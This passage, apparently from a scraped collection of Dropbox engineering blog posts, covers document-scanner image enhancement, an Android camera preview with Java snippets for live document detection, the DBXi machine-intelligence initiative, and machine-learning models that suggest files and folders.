behind using a mathematical machinery like the Poisson’s equation in the first place was that there is no single gain and offset that works for the whole image. In order to handle uneven illuminations and shadows, however, we could allow the gain and the offset to vary across the image: While this new formulation is more flexible than before, it has twice as many unknowns (the gain and the offset at each pixel, rather than simply the final output value), making it trickier and more expensive to solve. The key insight for reducing the computational cost and further constraining the problem is that the gain and the offset should vary relatively slowly across the image—we’re aiming to deal with illumination changes, not rainbow-colored paper! This allows us to solve the optimization problem at a much lower resolution compared to the input image, and therefore much faster. This also implicitly forces the unknown values to correlate locally, because we then upsample the gain and offset back to the original resolution. Once the gain and the offset are known across the image, we can plug them back into the above equation to obtain the final output image. What about color? So far our derivations have ignored color, even though most photos come in the form of an RGB image. The simplest way to deal with this is to apply the above algorithm to each of the R, G, B channels independently, but this can result in color shifts, since the channels are no longer constrained together. In our initial effort to combat this, we tried to substitute in the original RGB values for the output pixels that are not close to white. However, when we tried this, we encountered the effect of color constancy. Here’s a great illustration of this “illusion,” in which the two tiles marked A and B have the same pixel values, but appear to be very different: In our experiments, the output colors using this simple algorithm would look faded, even though the RGB values were exactly the same as the input! The reason is that the human visual system is based on relative brightness, not absolute ones; this makes colors “pop” more relative to the dull gray of the input, but not relative to the bright white background of the enhanced image. To deal with this effect, our algorithm converts the image into the HSV color space, and then copies the hue and saturation from the original image wherever appropriate. This results in much better color constancy, as seen below: Left: the original image. Middle: an enhanced image, with the background becoming white and the foreground preserved in exact R, G, B values. Note that the colors appear faded. Right: an enhanced image that tries to correct for the perceptual discrepancy. Handling (dog-eared) corner cases So far we have assumed that our document detection and rectification steps (which precede enhancement) work perfectly. While they provide reasonable results on most inputs, sometimes they have to operate on input images that violate our assumptions: In practice, many documents being scanned have edges that are not perfectly straight, and sometimes the corners are dog-eared. As a consequence, the rectified image may include some background that is not a part of the document. We detect and segment out these areas via a simple min-cut algorithm , so that the final output is more reflective of the user intent; the algorithm removes well-delineated dark areas near the borders. Left: an enhanced document image, without treating the boundaries. Because the document edges may be physically curved or dog-eared, the rectified image may contain some non-document regions. Right: an enhanced document image, with the boundaries treated. Putting it together Starting from a document boundary, we have shown how we rectify the image and then enhance it for readability. Our enhancement algorithm also contains a single free parameter that controls the contrast of the output document (plus the relative values of the coefficients introduced above, like k1 and k2 ), and we make it adjustable with a user-friendly interface so that you can get the exact appearance you want, as shown here: Try it out Try out the Dropbox document scanner today, and stay tuned for our next blog post. // Tags Machine Learning Ios Doc Scanner Android // Copy link Link copied Link copied", "date": "2016-08-16"},
{"website": "Dropbox", "title": "Augmented camera previews for the Dropbox Android document scanner", "author": ["Piotr Gurgul"], "link": "https://dropbox.tech/machine-learning/augmented-camera-previews-for-the-dropbox-android-document-scanner", "abstract": "Initializing camera preview (2) Listening for new frames (3) Receiving new frame from the camera (4) Converting the frame (5) Passing frame to document detector (6) Receiving quad coordinates (7) Drawing document outline (quad) over the preview Sample performance measurements Turning existing photos into scans Try it out With Dropbox’s document scanner , a user can take a photo of a document with their phone and convert it into a clean, rectangular PDF. In our previous blog posts ( Part 1 , Part 2 ), we presented an overview of document scanner’s machine learning backend, along with its iOS implementation. This post will describe some of technical challenges associated with implementing the document scanner on Android. We will specifically focus on all steps required to generate an augmented camera preview in order to achieve the following effect: Animated gif showing the live document preview in the android doc scanner This requires custom interaction with the Android camera and access to individual preview frames. Normally, when a third-party app requests a photo to be taken, it can be achieved easily in the following way: Copy Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\nstartActivityForResult(takePictureIntent, REQUEST_TAKE_PHOTO); This delegates the task of taking a photo to the device’s native camera application. We receive the final image, with no control over intermediate steps. However, we want to augment the live preview, detecting the document and displaying its edges. To do this, we need to create a custom camera application, processing each individual frame to find the edges, and drawing a blue quadrilateral that symbolizes the document’s boundaries in the live preview. The whole cycle consists of the following steps: System diagram showing the main steps involved in displaying live previews of the detected document Needless to say, steps (2) – (7) must take as little time as possible so that the movement of the blue quadrilateral appears to be smooth and remains responsive to camera movements. It is believed than 10-12 frames per second is the minimum frequency required for the human brain to perceive motion. This means the whole cycle presented on the diagram should take no more than 80 ms. The Android hardware landscape is also very fragmented, which poses additional challenges. Cameras range from 0.3 to 24 megapixels, and unlike iPhones we can’t take the presence of any hardware feature (such as autofocus, back-facing camera or physical flash LED) for granted. The code needs to defensively check if each requested feature is there. In the rest of the post, we’ll discuss each of the steps presented in the diagram. Initializing camera preview The first step to the augmented reality preview is to create a custom camera preview without any augmented reality. For gaining access to the device’s camera, we will be using android.hardware.Camera object. Note: The android.hardware.Camera has been deprecated in version 5.0 (API Level 21) and replaced with much more powerful android.hardware.camera2 API. However, at the time of writing this post, roughly 50% of the active Android devices ran versions older than 5.0, so we were unable to avail of the improved camera API. The very first step before starting preview is to confirm whether a device has a rear-facing camera. Unlike iOS, we cannot assume it is true; the Nexus 7 tablet, for example, was equipped with a front-facing camera only.We can perform such a check using the following snippet: Copy PackageManager pm = context.getPackageManager();\npm.hasSystemFeature(PackageManager.FEATURE_CAMERA); As per the documentation, PackageManager.FEATURE_CAMERA refers to the camera facing away from the screen. To check for the presence of a front camera, there is a separate flag available - FEATURE_CAMERA_FRONT . Hence, we are fine with the check above. Tip: Accessing device camera requires proper permissions. This includes both defining required permissions in AndroidManifest.xml: <uses-feature android:name=\"android.hardware.camera\" android:required=\"false\" /> <uses-feature android:name=\"android.hardware.camera.autofocus\" android:required=\"false\" /> <uses-feature android:name=\"android.hardware.camera.flash\" android:required=\"false\" /> and requesting permission.CAMERA permission at runtime so that it works on Android M and later versions. Another issue is that the camera sensor orientation that can vary depending on a specific device. The most common one is landscape, but so-called “reverse landscape orientation” used for the Nexus 5X camera sensor has caused a lot of problems to many apps that were unprepared. It is very important to set the display orientation correctly so that it works properly regardless of the device’s specific setup. The snippet below shows how to do it. Copy private void setCorrectOrientation() {\n    CameraInfo info = new CameraInfo();\n    Camera.getCameraInfo(getBackCameraId(), info);\n    int orientation = getWindowManager().getDefaultDisplay().getRotation();\n    int degrees = 0;\n    switch (orientation) {\n        case Surface.ROTATION_0:\n            degrees = 0;\n            break;\n        case Surface.ROTATION_90:\n            degrees = 90;\n            break;\n        case Surface.ROTATION_180:\n            degrees = 180;\n            break;\n        case Surface.ROTATION_270:\n            degrees = 270;\n            break;\n        default:\n            throw new RuntimeException(\"Unsupported display orientation\");\n    }\n\n    mCamera.setDisplayOrientation((info.orientation - degrees + 360) % 360);\n} Another very important thing to remember is the fact, that unlike iOS, there are multiple potential aspect ratios to support. On some devices, the camera capture screen has buttons that float over the preview, while on others there is a dedicated panel holding all the controls. Camera capture screen on the Samsung Galaxy S5 Camera capture screen on the Xiaomi Mi4 Camera capture screen on the Xiaomi Mi4 This is why we need to calculate the optimal preview size with the closest aspect ratio to our preview rectangle. The camera parameters object has a method called mCamera.getParameters().getSupportedPreviewSizes() that returns a list of preview dimensions supported by a given device. In order to find the best match, we iterate through the returned list and find the closest dimensions to the current preview size that match our aspect ratio (with some tolerance). This way, the document scanner will behave correctly even when unusual aspect ratio is needed due to e.g. operating in multi-window mode. Document scanner in multi-window mode on Samsung Galaxy S6 (Android 7.0) Binding the camera preview to a UI component There are several ways in which camera sensor data can be tied to an UI component. The oldest and arguably simplest way is using SurfaceView as shown in an official Google API demo example . However, SurfaceView comes with several limitations, as it’s just a drawing surface embedded inside the view hierarchy that is behind the window which contains all views. Two or more SurfaceViews cannot be overlaid, which is problematic for augmented reality use cases such as the document scanner, as issues with z-ordering may arise (and these issues will be likely device-specific). Another choice is a TextureView which is a first-class citizen in the view hierarchy. This means it can be transformed, scaled and animated like any other view. Once the camera object is acquired and parameters are set, we can start the preview by calling mCamera.startPreview() . Tip: It is very important to hold the camera object only when your app is in the foreground and release it immediately onPause . Otherwise, the camera may become unavailable to other apps (or our own app, if restarted). Displaying controls over the live preview In order to place UI components on top of the live preview, it’s best to use FrameLayout . This way, vertical ordering will match the order in which components were defined in the layout file. (1) First, we define TextureView (2) On top of it, we place custom view for drawing quadrilateral 3) As a last component, we define the layout containing camera controls and last gallery photo thumbnail Copy &lt;FrameLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n             android:layout_width=\"match_parent\"\n             android:layout_height=\"match_parent\"&gt;\n    &lt;TextureView &lt;!-- (1) --&gt;\n        android:id=\"@+id/camera_preview\"\n        ... /&gt; \n\n    &lt;QuadrilateralView &lt;!-- (2) --&gt;\n        android:id=\"@+id/quad_view\"\n        ... /&gt; \n    &lt;android.support.constraint.ConstraintLayout &lt;!-- (3) --&gt;\n        android:id=\"@+id/camera_controls\"&gt;\n        ...\n    &lt;/android.support.constraint.ConstraintLayout&gt;\n&lt;/FrameLayout&gt; This assumes that a TextureView is being used for the live preview. For SurfaceView , z-order can be adjusted with the setZOrderMediaOverlay method. Offering flash and torch options In order to improve the user experience in low light conditions we offer both torch and flash toggles. These can be enabled via camera parameters Parameters.FLASH_MODE_TORCH and Parameters.FLASH_MODE_ON correspondingly. However, many Android devices (most commonly tablets) don’t have a physical LED flash, so we need to check for its presence before displaying the flash and torch icons. Once the user taps on the torch or flash icon, we change the flash mode by calling mCamera.getParameters().setFlashMode(). It is important to remember that before changing camera parameters, we need to stop the preview, using mCamera.stopPreview(), and start it again when we are done, using mCamera.startPreview(). Not doing this can result in undefined behavior on some devices. Managing focus On devices that support it, we use FOCUS_MODE_CONTINUOUS_PICTURE to make the camera refocus on the subject very aggressively in order to keep the subject sharp at all times. On devices that don’t support it, it can be emulated by requesting autofocus manually on each camera movement, which in turn can be detected using the accelerometer. The supported focus modes can be obtained by calling mCamera.getParameters().getSupportedFocusModes() (2) Listening for new frames In order to receive a callback each time a new frame is available, we need to register a listener. For TextureView , we can do this by calling mTextureView.setSurfaceTextureListener Depending on whether a SurfaceView or TextureView has been used, the corresponding callback is either Camera.PreviewCallback with onPreviewFrame(byte[] data, Camera camera) invoked each time new frame is available or TextureView.SurfaceTextureListener with onSurfaceTextureUpdated(SurfaceTexture surface) method. Once a SurfaceView or TextureView is tied to the camera object, we can start preview by calling mCamera.startPreview() . (3) Receiving new frame from the camera Every time a new frame is available (for most devices, it occurs 20-30 times per second), the callback is invoked. When onPreviewFrame(byte[] data, Camera camera) is being used to listen for new frames, it’s important to remember that the new frame will not arrive until we call camera.addCallbackBuffer(mPreviewBuffer) in order to signal that we are done with processing the buffer and the camera is free to write to it again. If we use SurfaceTexture callbacks to receive new frames, onSurfaceTextureUpdated will be invoked every time new frame is available and it is up us whether it should be processed or discarded. (4) Converting the frame Our document detector described in the previous blog posts requires the frame, which is later passed to C++ code, to be of specific dimensions and in a specific color space. Specifically, this should be a 200 x 200px frame in RGBA color space. For onPreviewFrame(byte[] data, Camera camera) , the data byte array is usually in NV21 format , which is a standard for Android camera preview. This NV21 frame can be converted to an RGBA bitmap using the following code: Copy Camera.Parameters = camera.getParameters();\nYuvImage yuv = new YuvImage(data, parameters.getPreviewFormat(), width, height, null);\nByteArrayOutputStream out = new ByteArrayOutputStream();\nyuv.compressToJpeg(new Rect(0, 0, width, height), 100, out);\n\nbyte[] bytes = out.toByteArray();\nBitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length); The bad news is, using this method, it takes 300-500 ms to process a 1920 x 1080 frame, which makes it absolutely unacceptable for real-time applications. Fortunately, there are several ways to do this conversion much faster such as using OpenGL/OpenCV or native code. However, there are two RenderScript intrinsic scripts that can provide the requested functionality without having to drop down to lower-level APIs — ScriptIntrinsicResize combined with ScriptIntrinsicYuvtoRGB . By applying these two, we were able to get the processing time down to 10-25 ms thanks to the hardware acceleration. Things look much simpler when the preview is implemented using TextureView and onSurfaceTextureUpdated(SurfaceTexture surface) callback. This way, we can get the bitmap straight from the TextureView once a new frame is available: Copy int expectedImageWidth = pageDetector.getExpectedImageWidth();\nint expectedImageHeight = pageDetector.getExpectedImageHeight();\nBitmap bitmap = mTextureView.getBitmap(expectedImageWidth, expectedImageHeight); TextureView#getBitmap is generally known to be slow; however, when the dimensions of the requested bitmap are small enough, the processing time is very reasonable (5-15ms for our 200x200 case). While this isn’t a universal solution, it turned out to be both the fastest and the simplest for our application. Moreover, as we mentioned earlier, the camera sensor orientation is usually either landscape (90 deg) or reverse landscape (270 deg), so the bitmap will most likely be rotated. However, instead of rotating the whole bitmap, it is much faster to rotate the quadrilateral returned by the document detector instead. (5) Passing frame to document detector On top of the scaled bitmap, our document detector requires passing a so called rotation matrix . Such matrix essentially provides information about phone movement direction (like tilting), which expedites calculating the next position of the quadrilateral. Knowing the coordinates of the quadrilateral at a given time, and the direction in which the device was moved, the document detector can estimate the anticipated future position of the quadrilateral, which speeds up computations. In order to calculate the rotation matrix, we need to listen for two types of sensor events — Sensor.TYPE_MAGNETIC_FIELD and Sensor.TYPE_ACCELEROMETER that represent magnetic and gravity data. Having these, the rotation matrix can be obtained by calling SensorManager.getRotationMatrix . The document detector is written in C++, hence we need to make the call using JNI. In case we cannot obtain sensor data, we pass an identity matrix. Tip: Since calls to the detector can take anywhere from 20-100ms depending on Android device, they cannot be executed in the UI thread. We run them sequentially in a separate thread with elevated priority. (6) Receiving quad coordinates Once the call to document detector returns, we receive coordinates of the four points representing the quadrilateral that delimits the document edges. Understandably, these coordinates apply to the frame that was passed to the detector (e.g. 200x200 square that we mentioned), so we need to scale the coordinates to the original size of the preview. We also need to rotate the quadrilateral in case the camera orientation doesn’t match the orientation of the preview (see step (4) Converting frames, above). (7) Drawing document outline (quad) over the preview Having received frame coordinates, it is time to draw the quadrilateral over the camera preview (yet below camera controls). For simplicity and better control over z-ordering, we decided to create a custom View with an overriden onDraw() method that is responsible for drawing the quad on the canvas. Starting from Android 4.0 (Ice Cream Sandwich), drawing on a canvas is hardware-accelerated by default, which greatly improves performance. Each time we receive an updated frame, we need to call invalidate() on the View . The downside of such an approach is that we have no control over the real refresh rate. To be precise, we don’t know how much time will elapse between us calling invalidate() and the OS invoking onDraw() on our view. However, we have measured that this approach allows us to achieve at least 15 FPS on most devices. Tip: When implementing a custom view, it is very important to keep the onDraw() method as lightweight as possible and avoid any expensive operations, such as new object creation. If drawing using a custom view is too slow, there are many faster, yet more complex solutions such as having another TextureView or leveraging OpenGL. Sample performance measurements We measured the time consumed by each step (in milliseconds) on several Android devices. In each case, the Dropbox app was the only non-preinstalled app. However, since there are many different factors that influence the performance (e.g. phone movements), these results cannot be treated as a benchmark and are here solely for illustrative purposes. Timings for one full cycle of the preview process on various devices Note that faster devices usually have better cameras, so there is also more data to process. The worst case scenario for the document scanner would be a slow device with a very high resolution camera. Turning existing photos into scans The thumbnail we display in the lower left corner allows a user to preview the last gallery item. Tapping on it takes the user to the phone’s camera roll, where an existing photo can be selected for scanning. Using an existing photo in the doc scanner The last available thumbnail (if any) can be retrieved using the following query: Copy String[] projection =\n        new String[] {\n            ImageColumns._ID, ImageColumns.DATA, ImageColumns.DATE_TAKEN,\n        };\nCursor cursor =\n        getContentResolver()\n                .query(\n                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,\n                        projection,\n                        null,\n                        null,\n                        ImageColumns.DATE_TAKEN + \" DESC\"); Tip: To ensure proper orientation of the thumbnail (and a full-size photo), we need to read and interpret its ExifTags correctly. This can be achieved using android.media.ExifInterface class. There are 8 different tags representing orientation that need to be interpreted. If the cursor is empty (there are no photos in the gallery yet) or retrieving the bitmap threw an error (such as getting a null bitmap or exception), we simply hide the preview and make scanning from the gallery unavailable. Try it out Try out the Android Dropbox doc scanner today, and stay tuned for a future doc scanner post where we will describe the challenges in creating a multi-page PDF from a set of captured pages. // Tags Machine Learning Camera Preview Doc Scanner Augmented Reality Android // Copy link Link copied Link copied", "date": "2017-05-03"},
{"website": "Dropbox", "title": "Machine intelligence at Dropbox: An update from our DBXi team", "author": ["Timo Mertens"], "link": "https://dropbox.tech/machine-learning/machine-intelligence-at-dropbox-an-update-from-our-dbxi-team", "abstract": "Our workdays are getting noisier. Never-ending emails, text messages, constant notifications from more apps and more platforms—it’s disruptive and distracting. And then there’s content. All kinds of documents, spreadsheets, presentations, videos, and photos. Industry research shows that employees at larger organizations use an average of 36 cloud services at work , including tools for productivity, project management, communication, and storage. This information overload is a key source of pain for people at work—and a prime opportunity to leverage the help of machine intelligence. How do we define machine intelligence? When we talk about machine intelligence at Dropbox, we mean the whole range of applied machine learning, from simple linear classifiers to advanced deep learning networks. For many years we’ve been building a world-class machine learning team, improving our platform behind the scenes. We started with a lot of foundational work on image recognition to improve our users’ experience of organizing the massive amount of photos they keep on our platform. The fact that many of those photos have text in them led us to invest in our mobile document scanning capabilities and custom optical character recognition (OCR) pipeline to help our users quickly scan and find their content. We combined classical machine vision techniques with advanced deep learning methods to create a mobile scanner experience that was faster and more accurate than any off-the-shelf solutions we could find. A lot of the content in Dropbox is already in text-based documents, so search is another area of significant investment for us in terms of machine learning. We’ve now completely rebuilt our search infrastructure to improve the quality and speed of results from the hundreds of billions of pieces of content our users entrust to our platform. Because of our granular sharing permissions, each user has a unique corpus of documents to search within. This creates whole dimensions of personalization that web search engines largely ignore. Add to that activity signals related to relevance—such as files with recent comments or those recently viewed by team members—and you have a really productive use case for machine learning. Each product innovation makes our users’ lives a little better, but how can we make larger leaps toward freeing people’s attention so they can find focus and flow at work? Instead of people working harder to keep up, can we make their tools smarter? To achieve this, we’re weaving our unique approach to machine intelligence into all of our products and surfaces. We call this effort the Dropbox intelligence initiative (DBXi) , and we’re excited to share some updates. What’s the big problem we’re trying to solve? We see tremendous potential to use machine intelligence to improve the work experience itself. Quieting the noise for individuals is the first step toward helping people in organizations work better together. There are lots of engineering challenges behind creating an intelligent workspace, but the motivation comes from design and product insights. Our researchers have invested years studying how the rise of SaaS applications and mobile have changed the way contemporary knowledge workers do their jobs and run their teams. This research shows three kinds of activity that people spend way too much time on: Organization: Work content is spread across files and cloud content in different silos. We spend a lot of time just finding what we need before we can start working on it. Contextualization: It’s hard to put content together with the communication about it. Constantly shifting context requires mental overhead and cuts into our ability to think clearly, leading to stress and burnout. Prioritization: With everything so scattered and fragmented, it’s hard to know what’s really important. These activities are an increasing part of modern work, and they all get in the way of maintaining focus. And these problems are compounded for every team member as well, so there’s a lot to gain from taming this complexity. We think our intelligence solutions can help address these pain points at work. What’s our next step? One example of a user experience we’re exploring as part of the DBXi initiative is demonstrated in the animation above. In this prototype, we’ve evolved the existing desktop surface where our users check sync activity and see notifications into a more dynamic view that intelligently highlights their most important work connected to Dropbox. We suggest the most relevant content by traversing a user-specific graph that connects people, content, and activity signals in privacy-preserving ways. This includes not only files but also content like Google Docs , as well as collaborative activity in emails, messaging apps, and calendars—whatever a user chooses to connect to Dropbox. And we make all this content searchable in this surface as well. To cut through the noise, we prioritize notifications and show content related to calendar events in personalized activity feeds. And to declutter these feeds, we cluster content and collaborative activity across silos so users can immediately see which projects need their attention and be only a click away from the content they need. This prototype is only one of many surfaces we’re exploring for intelligence. The data graphs and models we build for products and search are generally reusable across surfaces and features. By scaling our internal machine intelligence platform, DBXi is multiplying the efforts of our dedicated intelligence product team so all our engineers can modify and validate models for intelligent features, improved search, and other business optimizations. These scalable methods and common infrastructure give our product managers and designers the flexibility they need to experiment and take chances on novel directions. From a technical perspective, these are important problems to solve, and success means not only intuitive user interfaces, but also lightning-fast response times, industry-leading prediction, and the highest standards for maintaining data privacy . Want to help us build the next-generation intelligent workspace? We’re hiring ! // Tags Machine Learning Machine Intelligence // Copy link Link copied Link copied", "date": "2018-09-13"},
{"website": "Dropbox", "title": "Using machine learning to predict what file you need next, Part 2", "author": ["Permutohedra"], "link": "https://dropbox.tech/machine-learning/using-machine-learning-to-predict-what-file-you-need-next-part-2", "abstract": "Improving file suggestions Handling cloud-based documents Building folder suggestions Aside: improving training infrastructure Handling Paper docs Bringing the models together Conclusion At Dropbox, we are building smart features that use machine intelligence to help reduce people’s busywork. Since introducing content suggestio n s , which we described in our previous blog post , we have been improving the underlying infrastructure and machine learning algorithms that power content suggestions. One new challenge we faced during this iteration of content suggestions was the disparate types of content we wanted to support. In Dropbox, we have various kinds of content—files, folders, Google Docs , Microsoft Office documents , and our own Dropbox Paper . Regardless of the types of content our users work with, we want to make sure that the most relevant content is available for them at their fingertips. However, these types of content live in different persistent stores, have different metadata, and are used to varying extents by different users. This made it difficult to create a single machine learning pipeline to rule them all, so to speak. The Dropbox filesystem supports many different types of content, e.g. regular files and folders, Paper docs, and cloud-based content like Google Docs or Microsoft Office docs. Suggesting the right set of content to a user requires us to handle all these types. While waiting for the underlying infrastructure to catch up, we decided to tackle these types individually, in order to bring improved suggestions to our users more quickly. In the rest of this blog post, we will describe how we trained and improved ML models for these types of content, and how we were able to combine them in a principled way. We will also describe the improved tooling we built and used along the way. Improving file suggestions Once we released content suggestions on the Dropbox homepage in April, we immediately set out to improve the performance of the ML model. We approached this task from two different angles: first, how do we incorporate more signals to make better predictions? Next, how can we train a model to better use these signals? In the previous blog post, we mentioned that we wanted to incorporate the type of a file when making predictions. There are many ways to define and categorize the type of a file, however; for instance, one could have a sparse set of major categories (e.g. texts, images, videos), a more fine-grained set of categories (e.g. raw texts, web documents, source codes, word-processor files), or even semantic categories (e.g. contracts, receipts, screenshots, proposals). In our case, we began with file extensions, as this information is generally available at both training and inference time and can embody some of the essential properties of a file. One could naively encode the file extensions as one-hot vectors, where the dimensionality of the vectors is the number of all possible file extensions. However, this is not ideal for two reasons: first, the vectors can be very high-dimensional and sparse, which requires models capable of extracting useful signals from these vectors. Second (and more importantly), the distribution of the file extensions is very heavy-tailed, meaning that it is difficult for the model to learn about the more exotic extensions. Relative prevalence of various extensions in the dataset we collected, showing the long tail of extensions. To combat these problems, we decided to create a file extension embedding trained from a weakly-supervised task—we will describe this in our next blog post, but in a nutshell, we trained the file extension embedding to predict the likelihood of two file extensions co-occurring in a single upload in Dropbox. This yielded a dense vector with low dimensionality, such that semantically similar file extensions (e.g. JPEGs and PNGs) were close in the embedding space. This enabled our model to effectively learn from unevenly distributed data, improving both the offline and online performance of our model. Another important piece of signal we elected to use is filenames. For instance, when the model encounters a PDF file, it may know that it is a textual document, but will not have any idea what kind of document it is. If the filenames are available, the model may find some clue in it. In our first attempt to incorporate filenames as a signal, we treated a filename as a bag of characters, akin to the bag-of-words model in NLP. While this model failed to capture the semantic meaning of a given filename, we did see some improvement in our offline evaluation as this feature could help the model identify whether the file was a user-generated file or a programmatically generated one. We later moved to a sequential model with a char-RNN, which ingested one character of the filename at a time. The state vector of the char-RNN after all the characters were ingested would serve as the embedding vector for the filename. Such a sequential model is better at detecting temporary filenames, e.g. j8i2ex915ed.bin. Filename can be incorporated as a feature into the content suggestions model via a char-RNN. Handling cloud-based documents As mentioned in the introduction, Dropbox supports various third-party content. It is possible to create cloud-based files (such as Google Docs and Microsoft Office 365 files) all within Dropbox. We aimed to support such content types in the content suggestions model, but realized that for these relatively recent partnerships, the amount of training data available was much smaller than for your everyday files—like PDFs and JPEGs. As such, we ended up crafting a separate dataset, and instead of merging this dataset with the main file suggestions dataset, we trained a separate model using the same network architecture. Building folder suggestions The most important goal of content suggestions is to enable our users to find their important files quickly. However, from a quick-and-dirty online experiment, we observed that the click-through rate was measurably higher for folders—we did this by mixing in some folders, generated from a heuristic, with the files suggested by the original (file-only) content suggestions model. We hypothesized that the user may want to have a quick access to the folder that contains their working files, even if it meant an extra click to get to the files. Conveniently, suggesting a folder is a reasonable alternative to suggesting multiple files therein—while the folder itself might not be precise, this can improve the overall recall (by saving rooms for other suggestions) if we are willing to tolerate the potential extra click to get to the file. Now, whether it was better to suggest an important file or its parent folder is an interesting question, but it was one that could only be answered by feedbacks from our users. Hence, we made a tactical decision early on to decouple file suggestions and folder suggestions from each other. This did not prevent us from reusing the offline data and training pipeline—which we had built for powering file suggestions—for folder suggestions. We trained separate models and then later used a combiner model to mix the two resulting lists of candidates, discussed in a later section of this post. We train and serve models for files and folders, using very similar pipelines. While reusing the existing pipeline, we made the following tweaks appropriate for handling folders. Generating candidates: for file suggestions, it sufficed to obtain the list of files for which the user had registered an event most recently; however, for folder suggestions, we took the parent folders of such files, in addition to any folders that had a registered event. Fetching signals: for file suggestions, we fetched the events on the candidate files for the last 90 days, but for folder suggestions, we fetched the events for the files belonging to the candidate folders, in addition to the events on the candidate folders themselves. This allowed the model to recognize folders that might have had numerous “low-importance” files, as well as folders that have few “high-importance” files, and let it adjudicate which should be ranked higher. Creating training data: in our previous blog post, we mentioned that we used two sources to obtain positive candidates for the offline dataset: first, we had labeled data from running online experiments with heuristics; second, we had an unsupervised dataset of user events in Dropbox, from which we could create a supervised dataset for predicting whether a file would be interacted with in the near future. For the second case, the definition of this future interaction was changed to encompass both a direct operation on the folder and an operation on some files in the folder. With these changes in place for the offline pipeline, we could train a model to score folders in the same way we scored files. Aside: improving training infrastructure Although the neural network we had been using was not very deep, we had many new signals, datasets, and tweaks that we were experimenting with, as described in the previous sections. This made rerunning experiments and tuning hyperparameters a repetitive chore, especially since the hyperparameter set was fairly large—the depth and width of the network, the choice of optimizer, learning rate, activation function and regularizer, to name a few. Previously, we had used a naive grid search for optimizing these hyperparameters. However, it is well known that the grid search method can be costly and ineffective. To better conduct the training jobs, our machine learning infrastructure team built a tool called dbxlearn. dbxlearn is an elastic and scalable computing environment for machine-learning training and provides more advanced algorithms, such as Bayesian Optimization, for hyperparameter tuning. With dbxlearn, we have been able to perform many more tuning jobs for offline experiments—and test different signals, data, and models in much faster iteration—to deliver the best model and user experience with content suggestions. Handling Paper docs As of last week, Paper docs are now part of the Dropbox filesystem . However, as the development of our content suggestions models preceded this migration, we needed to temporarily support Paper docs that were (previously) not a part of a user’s Dropbox. As we did with cloud-based documents, we decided to create a separate dataset and heuristic for handling Paper docs, and merge the results intelligently, as we discuss in the next section. Bringing the models together As hinted earlier, we developed individual models for each of the content types. The key challenge that arises then is to rank the suggestions generated by each of these submodels against one another. To achieve this, we modeled the scores generated by each of the submodels as a blackbox function with the following properties: For each submodel, there exists a function that maps the score generated by the submodel to the expected CTR for a suggested item of the given score. is monotonic and continuous. If such exists for each submodel, then we can map the score generated by the submodel via to get the expected CTR, which is a quantity comparable across submodels. Once we have the expected CTR for all suggestions from all submodels, we can rank the suggestions by the expected CTR. In practice, we further assumed that is a cubic spline, which allowed us to discretize the representation of . Given a sequence where is the submodel score and is the indicator variable corresponding to click or non-click, the log-likelihood of the sequence given is . We can then recover the spline parameters of that maximizes the log-likelihood, given the constraints on . Given a dataset of ranked items generated by a submodel, we can fit a function such that we maximize the a posteriori likelihood of the observation. We model the function as a cubic spline, sampled along the distributions of raw scores, to discretize the problem. Solving for these normalizing functions requires an initial online experiment that can measure how likely it is that an item of a particular score is clicked. To bootstrap this problem, we first ran the submodels as shadows to the production models—meaning that we generated candidates and scores without showing them to users. We then aligned the resulting histograms of scores, yielding a simple affine transform of the scores, which we used to create the initial mixture model. This mixture model was then used in a new online experiment shown to the users, generating the scores and labels needed in the illustration above. We were then able to verify that a new mixture model generated with the normalizing functions yielded better CTR overall. Conclusion We evaluated each of the improvements and layering techniques discussed in the earlier sections via online A/B tests on our users’ logged-in home pages until we reached statistical significance, in addition to other experimental ideas. Some of the experiments we ran yielded negative results and did not get incorporated into the production model. All in all, we were able to increase the percentage of user sessions with at least one clicked suggestions by more than 50%, which gave us the confidence to roll out the production model at scale. Launching a machine-intelligence-powered feature to all users of Dropbox is an endeavor made possible by the collaboration among many teams. In addition to the work of machine learning engineers, the work of ML infrastructure teams and of teams building the user experience around the intelligent suggestions was equally critical to delivering value to our users. If you are interested in working on intelligent products, machine learning systems, and infrastructure, come join us. We’re hiring! // Tags Machine Learning Machine Intelligence Neural Networks Ranking // Copy link Link copied Link copied", "date": "2019-10-02"},
{"website": "Dropbox", "title": "Using machine learning to predict what file you need next", "author": ["Neeraj Kumar"], "link": "https://dropbox.tech/machine-learning/content-suggestions-machine-learning", "abstract": "Heuristics Machine learning model v1 Metrics and iteration Machine learning model v2 As we laid out in our blog post introducing DBXi , Dropbox is building features to help users stay focused on what matters. Searching through your content can be tedious, so we built content suggestions to make it easier to find the files you need, when you need them. We’ve built this feature using modern machine learning (ML) techniques, but the process to get here started with a simple question: how do people find their files? What kinds of behavior patterns are most common? We hypothesized the following two categories would be most prevalent: Recent files : The files you need are often the ones you’ve been using most recently. These change over time, of course, but often the recent past is a good indicator of the near future. This can also include your files that have recent activity by others, not just by you. For example, a co-worker just wrote the first draft of a report, and shared it with you so you can edit it. Even if you haven’t opened it yet, the fact that it was recently shared with you is a strong cue that you might want to edit it now. Frequent files : Another category of your files are ones that you come back to again and again. This could include your personal to-do list, weekly meeting notes, or team directory. There’s some overlap with the previous category here—if you’re hard at work on a report due next week, you’ll probably open the report quite frequently and it will be among the most recent files you’ve accessed as well. Heuristics Starting with this basic understanding of the kinds of files users access, we built a system using a set of simple heuristics—manually-defined rules that try to capture the behaviors we described above. Here are the most successful: Recency : We can present your files to you in reverse-chronological order, i.e., most recent first. We already show this to users in dropbox.com today, and it’s a good baseline to improve upon. Frequency : Your most frequently used files over the last week are likely to be different from the ones over the last year. For simplicity, we started with a middle-ground between these options, e.g., one month. We count the number of accesses of each of your files in the last month and display the files with the highest counts. Frecency : The combination of the two options above is a heuristic called frecency . It looks for your files that have some recent activity, and/or were accessed frequently, ranking files that match both criteria higher. We decay the weight assigned to each access, based on how long ago it was. Accessing a file five times in the past week, for instance, makes it more likely you’ll use it again soon, compared to a file you accessed ten times a couple of months ago. Deploying and improving heuristics Starting with heuristics allows one to launch with a fairly simple implementation and start logging user reaction based on understandable behavior. In our case, we were able to use these simple heuristics to power the first version of content suggestions. That meant we could focus on all the other pieces needed to build this feature—the design, front-end code, back-end code, code to fetch a list of candidate files for each user, code to get the relevant metadata about access times for each file, etc. Logging was critical for this initial version. Once we have a feature launched to some users (we often run initial experiments to a small % of users with our feature gating system 